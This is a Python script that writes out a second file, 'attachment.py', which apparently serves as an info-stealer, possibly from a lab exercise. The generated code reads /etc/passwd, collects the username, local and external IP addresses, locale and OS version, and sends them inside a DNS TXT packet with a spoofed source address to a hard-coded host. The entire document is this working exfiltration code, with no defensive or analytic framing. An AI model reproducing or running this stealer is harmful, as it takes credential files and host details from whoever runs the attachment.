
if __name__ == "__main__":

    with open("attachment.py" , "w") as f:
        f.write("""import os
import socket
import urllib.request
import locale
import platform
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from scapy.layers.dns import DNS
from scapy.layers.dns import DNSRR, DNSQR
        
if __name__ == "__main__":        
        
    # print(os.name) #posix for linux ot nt for windows
    if (os.name == "posix"): # linux
        with open("/etc/passwd", "rb") as f:
            pass_file = f.read()
        available_languages = locale.locale_alias.keys()
        #for locale_name in available_languages:
        #   print(locale_name)
        user_language, _ = locale.getdefaultlocale()
        # print(user_language)
        version = os.uname().nodename
        #print("Version:", version)
    else: # windows
        #with open("C:\\Windows\\System32\\config", "rb") as f: #  Permission denied: 'C:\\Windows\\System32\\config'
        #    pass_file = f.read()
        available_languages = locale.windows_locale.values()
        #for language in available_languages:
        #    print(language)
        user_language, _ = locale.getdefaultlocale()
        #print(user_language)
        version = platform.platform()
        #print(version)


    #print(pass_file) #- work in linux doset work on windows!!!
    username = os.getlogin() 
    # print(os.getlogin()) # works in linux and windows

    # works in linux and windows
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    inside_ip = sock.getsockname()[0]
    sock.close()
    #print(inside_ip) 

    # works in linux and windows
    ip_service = "https://api.ipify.org"  # External service to get the IP
    response = urllib.request.urlopen(ip_service)
    outside_ip = response.read().decode()
    #print(outside_ip)


    #dns sending
    message = "passwords: " + str(pass_file) + "\\nusername: " +  username + "\\nlocal IP: " + inside_ip + "\\noutside IP: " + outside_ip + "\\navailable_languages: " + str(available_languages) + "\\nuser language: " + user_language + "\\nOS version: " + version



    # Create DNS layer
    dns_layer = DNS(
        id=1234,  # Set the DNS packet ID
        qr=0,  # Query/Response flag: 0 for query, 1 for response
        qd=DNSQR(qname="example.com")  # Set the query domain name
    )

    # Create DNS Resource Record layer with the desired message
    dnsrr_layer = DNSRR(
        rrname="example.com",  # Resource record domain name
        type="TXT",  # Resource record type: TXT
        rdata= message  # Message text
    )

    # Create UDP layer
    udp_layer = UDP(
        sport=RandShort(),  # Set random source port
        dport=53  # Set destination port to 53 (DNS)
    )

    # Create IP layer
    ip_layer = IP(
        src="192.168.0.1",  # Set source IP address
        dst="10.0.2.15"  # Set destination IP address
    )

    # Construct the packet by combining the layers
    packet = ip_layer / udp_layer / dns_layer / dnsrr_layer / message

    # Send the packet
    send(packet)
    print("send!")""")


